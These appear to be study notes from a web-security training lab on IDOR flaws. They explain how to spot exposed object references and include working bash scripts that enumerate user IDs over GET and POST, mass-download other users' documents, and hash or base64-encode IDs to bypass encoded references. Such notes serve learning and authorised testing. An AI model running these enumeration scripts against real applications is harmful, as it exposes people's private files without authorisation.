## delete


# IDOR
IDOR is among the most common web vulnerabilities and can lead to accessing data that should not be accessible by attackers. What makes this attack very common is essentially the lack of a solid access control system on the back-end. As web applications store users' files and information, they may use sequential numbers or user IDs to identify each item. Suppose the web application lacks a robust access control mechanism and exposes direct references to files and resources. In that case, we may access other users' files and information by simply guessing or calculating their file IDs.

# Identifying IDORs
## URL Parameters & APIs
The very first step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ?uid=1 or ?filename=file_1.pdf). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.

In the most basic cases, we can try incrementing the values of the object references to retrieve other data, like (?uid=2) or (?filename=file_2.pdf). We can also use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files that are not our own would indicate an IDOR vulnerability.

## AJAX Calls
We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.

For example, if we did not have an admin account, only the user-level functions would be used, while the admin functions would be disabled. However, we may still be able to find the admin functions if we look into the front-end JavaScript code and may be able to identify AJAX calls to specific end-points or APIs that contain direct object references. If we identify direct object references in the JavaScript code, we can test them for IDOR vulnerabilities.

## Understand Hashing/Encoding
Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If we find such parameters using encoded or hashed values, we may still be able to exploit them if there is no access control system on the back-end.

## Compare User Roles
If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.

# Mass Enumeration
We can click on [CTRL+SHIFT+C] in Firefox to enable the element inspector, and then click on any of the links to view their HTML source code.

We can pick any unique word to be able to grep the link of the file. In our case, we see that each link starts with <li class='pure-tree_link'>.

## GET method to find resources
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

## POST method to find resources
```bash
#!/bin/bash

# Base URL
base_url="http://94.237.49.212:52909"

# User-Agent string for curl
user_agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Loop through uid from 1 to 20
for uid in {1..20}; do

  echo "Fetching documents for uid=$uid..."

    # Make the POST request and extract file paths
  files=$(curl "${base_url}/documents.php" --compressed -X POST \

    -H "User-Agent: ${user_agent}" \

    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \

    -H "Accept-Language: en-US,en;q=0.5" \

    -H "Accept-Encoding: gzip, deflate" \

    -H "Content-Type: application/x-www-form-urlencoded" \

    -H "Origin: ${base_url}" \

    -H "Connection: keep-alive" \

    -H "Referer: ${base_url}/" \

    -H "Upgrade-Insecure-Requests: 1" \

    --data-raw "uid=${uid}" | grep -oP "\/documents.*?\.(pdf|doc|docx|txt|xlsx|xls|ppt|pptx)")

  # Download each file found

  for file in $files; do

    file_url="${base_url}${file}"

    echo "Downloading $file_url..."

    wget -q "$file_url" -P downloaded_files

  done

done


echo "Download process complete."
```

# Bypassing Encoded References
## GET method to find resources
```bash
#!/bin/bash
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0 | tr -d ' -'); do
        curl -sOJ "http://94.237.49.212:52909/download.php?contract=$hash"
    done
done
```

**POST method to find resources**
```bash
#!/bin/bash
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

**Cat files content**
```bash
#!/bin/bash
# Loop through all files in the current directory
for file in *; do
    # Check if the file starts with "contract"
    if [[ -f "$file" && "$file" == contract* ]]; then
        echo "Contents of $file:"
        cat "$file"
        echo ""  # Add a newline for better readability between file contents
    fi
done
```

## IDOR in Insecure APIs
Intercept a request in Burp.

- Change unique objects identifiers GET/POST
- Forward every request to map endpoints
- Change different parameters(role) 
- Perform HTTP Verb Tampering

